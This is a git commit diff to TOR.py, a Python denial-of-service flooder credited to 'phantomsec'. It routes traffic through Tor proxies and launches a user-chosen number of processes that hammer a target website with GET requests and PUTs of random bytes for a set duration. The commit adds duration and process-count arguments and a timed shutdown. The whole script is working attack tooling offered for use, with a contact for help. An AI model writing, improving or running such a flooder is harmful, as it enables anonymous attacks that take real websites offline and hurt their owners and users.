8d9433121e5534eb57971aba81ea92911c66fd8b
PeaceNIRA <72322069+PeaceNIRA@users.noreply.github.com>
2021-06-22 12:31:30 +0200

    Update TOR.py

--- TOR.py
+++ TOR.py
@@ -4,7 +4,7 @@ import socket
 import sys
 import time
 import os
-from termcolor import colored
+import signal
 import random
 import multiprocessing
 import warnings
@@ -12,12 +12,16 @@ socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
 socket.socket = socks.socksocket
 import requests
 
-if len(sys.argv)<2:
-    print(colored(f"Usage: {sys.argv[0]} [WEBSITE]", "red"))
+if len(sys.argv)<4:
+    print(f"\033[91mUsage: {sys.argv[0]} [WEBSITE] [TIME] [PROCESSES (THE HIGHER THE BETTER)]\033[0m")
     sys.exit(1)
     
-print(colored("TOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help. [can take up to a minute to start]", "magenta"))
+os.system('clear')
+print("\033[91mTOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help. [can take up to a minute to start]\033[0m")
 target = sys.argv[1]
+dur = int(sys.argv[2])
+thr = int(sys.argv[3]) 
+start_time = time.time()
 session = requests.session()
 session.proxies = {'http':  'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'}
@@ -28,9 +32,8 @@ def main2(url):
       try:
         for i in range(1000000000000):
              b = session.get(url).text
-             print(b)
              session.get(url)
-             print(requests.get(url)).content
+             b2 = requests.get(url).content
              random_bytes = random._urandom(1490)
              session.put(target, random_bytes)
              counter += 1
@@ -38,11 +41,30 @@ def main2(url):
       except Exception:
          pass
 
-jobs = []
-count = 0
-for i in range(800):
-    t1 = multiprocessing.Process(target=main2, args=(target,))
-    count += 1
-    jobs.append(t1)
-    t1.start()
+class timeError(Exception):
+    """a error raised when to kill the program."""
+    pass
+    
+if __name__ == "__main__":
+  os.setpgrp()
+  try:
+      jobs = []
+      count = 0
+      for i in range(thr):
+          t1 = multiprocessing.Process(target=main2, args=(target,))
+          jobs.append(t1)
+          t1.start()
+          time.sleep(0.1)
+      print(f"\033[92m\033[4mflood started for {str(dur)} seconds, with {str(thr)} processes. made by phantomsec\033[4m\033[92m\033[0m")
+      while True:
+        current_time = time.time()
+        elapsed_time = current_time - start_time
+        if int(elapsed_time) < dur:
+          pass
+        else:
+          raise timeError
+  except timeError:
+    print("exitting")
+    os.killpg(0, signal.SIGKILL)
+    exit()
     
